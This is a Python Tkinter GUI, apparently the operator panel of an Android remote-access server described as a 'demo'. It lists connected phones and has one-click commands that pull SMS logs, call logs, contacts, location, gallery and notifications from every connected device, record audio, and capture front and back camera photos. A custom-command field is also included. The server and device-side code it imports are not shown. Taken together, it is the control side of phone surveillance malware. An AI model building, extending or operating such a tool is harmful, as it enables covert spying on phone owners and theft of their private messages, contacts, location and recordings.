#!/usr/bin/env python3
"""
Android Device Demo Server - GUI Wrapper
Wraps the existing android_demo_server.py with a Tkinter GUI.

Usage: python3 android_demo_server_gui.py
Falls back to console mode if Tkinter is not available.
"""

import sys
import os
import threading
import time
import queue
import json

# Ensure we can import from the server module
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Try tkinter first - if not available, just run console server
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox
    TKINTER_OK = True
except ImportError:
    TKINTER_OK = False

# Import the DemoServer class from the existing working server
from android_demo_server import DemoServer, DeviceSession


class ServerGUI:
    """Tkinter GUI wrapper for the Android Demo Server."""
    
    def __init__(self, root):
        self.root = root
        self.root.title("Android Device Demo Server - GUI v5.1")
        self.root.geometry("950x650")
        self.log_queue = queue.Queue()
        self.server = None
        self.server_thread = None
        self.setup_gui()
        self.poll_logs()

    def setup_gui(self):
        """Build the GUI layout."""
        main = ttk.Frame(self.root, padding="8")
        main.pack(fill=tk.BOTH, expand=True)

        # ── Server Control ──
        ctrl = ttk.LabelFrame(main, text="Server Control", padding="8")
        ctrl.pack(fill=tk.X, pady=(0, 6))

        ttk.Label(ctrl, text="Host:").grid(row=0, column=0, padx=4)
        self.host_var = tk.StringVar(value="0.0.0.0")
        ttk.Entry(ctrl, textvariable=self.host_var, width=14).grid(row=0, column=1, padx=4)

        ttk.Label(ctrl, text="Port:").grid(row=0, column=2, padx=4)
        self.port_var = tk.StringVar(value="8000")
        ttk.Entry(ctrl, textvariable=self.port_var, width=7).grid(row=0, column=3, padx=4)

        self.btn_start = ttk.Button(ctrl, text="Start Server", command=self.start_server)
        self.btn_start.grid(row=0, column=4, padx=8)
        self.btn_stop = ttk.Button(ctrl, text="Stop Server", command=self.stop_server, state=tk.DISABLED)
        self.btn_stop.grid(row=0, column=5, padx=4)

        self.status_label = ttk.Label(ctrl, text="● Server Stopped", foreground="gray")
        self.status_label.grid(row=0, column=6, padx=8)

        # ── Connected Devices ──
        dev_frame = ttk.LabelFrame(main, text="Connected Devices", padding="8")
        dev_frame.pack(fill=tk.BOTH, expand=False, pady=(0, 6))

        cols = ("id", "ip", "model", "status", "img", "vid", "notif")
        self.tree = ttk.Treeview(dev_frame, columns=cols, show="headings", height=5)
        for c, t, w in [("id","ID",40),("ip","IP",100),("model","Model",150),
                        ("status","Status",70),("img","Img",50),("vid","Vid",50),("notif","Notif",60)]:
            self.tree.heading(c, text=t)
            self.tree.column(c, width=w)
        self.tree.pack(fill=tk.BOTH, side=tk.LEFT)
        sb = ttk.Scrollbar(dev_frame, orient="vertical", command=self.tree.yview)
        sb.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.configure(yscrollcommand=sb.set)

        # ── Command Buttons ──
        cmd_frame = ttk.LabelFrame(main, text="Quick Commands", padding="8")
        cmd_frame.pack(fill=tk.X, pady=(0, 6))

        quick_cmds = [
            ("Device Info", "get_device_info"),
            ("Location", "get_location"),
            ("Gallery List", "get_gallery_list"),
            ("SMS Logs", "get_sms_logs"),
            ("Call Logs", "get_call_logs"),
            ("Contacts", "get_contacts"),
            ("App List", "get_app_list"),
            ("Notifications", "get_notifications"),
            ("Storage Info", "get_storage_info"),
            ("Record Audio", "record_audio"),
            ("Capture Front", "capture_front"),
            ("Capture Back", "capture_back"),
        ]
        for i, (label, cmd) in enumerate(quick_cmds):
            row = i // 6
            col = i % 6
            ttk.Button(cmd_frame, text=label, width=14,
                       command=lambda c=cmd: self.quick_send(c)).grid(row=row, column=col, padx=2, pady=2)

        # ── Custom Command ──
        custom_frame = ttk.LabelFrame(main, text="Custom Command", padding="8")
        custom_frame.pack(fill=tk.X, pady=(0, 6))

        ttk.Label(custom_frame, text="Command:").grid(row=0, column=0, padx=4)
        self.cmd_entry = ttk.Entry(custom_frame, width=25)
        self.cmd_entry.grid(row=0, column=1, padx=4)
        ttk.Label(custom_frame, text="Args (JSON):").grid(row=0, column=2, padx=4)
        self.args_entry = ttk.Entry(custom_frame, width=25)
        self.args_entry.grid(row=0, column=3, padx=4)
        ttk.Button(custom_frame, text="Send", command=self.send_custom).grid(row=0, column=4, padx=8)

        # ── Log ──
        log_frame = ttk.LabelFrame(main, text="Server Log (live)", padding="8")
        log_frame.pack(fill=tk.BOTH, expand=True)

        self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state=tk.DISABLED,
                                                   bg="#1e1e1e", fg="#d4d4d4",
                                                   font=("Consolas", 9))
        self.log_text.pack(fill=tk.BOTH, expand=True)

    def start_server(self):
        """Start the server in a background thread."""
        if self.server_thread and self.server_thread.is_alive():
            messagebox.showwarning("Warning", "Server already running!")
            return
        host = self.host_var.get().strip()
        try:
            port = int(self.port_var.get().strip())
        except ValueError:
            messagebox.showerror("Error", "Port must be a number")
            return

        self.server = DemoServer(host=host, port=port, log_queue=self.log_queue, console_mode=False)
        self.server_thread = threading.Thread(target=self.server.start, daemon=True)
        self.server_thread.start()

        self.btn_start.config(state=tk.DISABLED)
        self.btn_stop.config(state=tk.NORMAL)
        self.status_label.config(text="● Server Running", foreground="green")

    def stop_server(self):
        """Stop the running server."""
        if self.server:
            self.server.running = False
            try:
                self.server.server_socket.close()
            except:
                pass
        self.btn_start.config(state=tk.NORMAL)
        self.btn_stop.config(state=tk.DISABLED)
        self.status_label.config(text="● Server Stopped", foreground="gray")
        self._log("Server stopped.")

    def quick_send(self, command):
        """Send a predefined command to all devices."""
        if not self.server or not self.server.running:
            messagebox.showwarning("Warning", "Start the server first!")
            return
        self.server.send_command_to_all(command)
        self._log(f"Sent: {command}")

    def send_custom(self):
        """Send a custom command with optional JSON args."""
        if not self.server or not self.server.running:
            messagebox.showwarning("Warning", "Start the server first!")
            return
        cmd = self.cmd_entry.get().strip()
        if not cmd:
            messagebox.showwarning("Warning", "Enter a command")
            return
        args = self.args_entry.get().strip()
        self.server.send_command_to_all(cmd, args)
        self._log(f"Sent: {cmd} {args}")
        self.cmd_entry.delete(0, tk.END)
        self.args_entry.delete(0, tk.END)

    def _log(self, msg):
        """Append a message to the log text widget."""
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, msg + "\n")
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def poll_logs(self):
        """Poll the log queue and update the display (runs every 100ms)."""
        try:
            while True:
                msg = self.log_queue.get_nowait()
                self._log(msg)
        except queue.Empty:
            pass

        # Refresh device table
        if self.server and self.server.running:
            for item in self.tree.get_children():
                self.tree.delete(item)
            with self.server.lock:
                for sid, s in self.server.sessions.items():
                    status = "ONLINE" if s.connected else "OFFLINE"
                    model = s.device_info.get("model", "Unknown") if s.device_info else "Unknown"
                    self.tree.insert("", tk.END, values=(
                        sid, s.address[0], model, status,
                        s.total_images_received, s.total_videos_received,
                        s.total_notifications_received
                    ))

        self.root.after(100, self.poll_logs)


def main():
    root = tk.Tk()
    app = ServerGUI(root)
    root.protocol("WM_DELETE_WINDOW", lambda: [
        app.stop_server() if app.server else None,
        root.destroy()
    ])
    root.mainloop()


if __name__ == "__main__":
    if TKINTER_OK:
        main()
    else:
        print("Tkinter not available. Starting console server...")
        server = DemoServer()
        server.start()
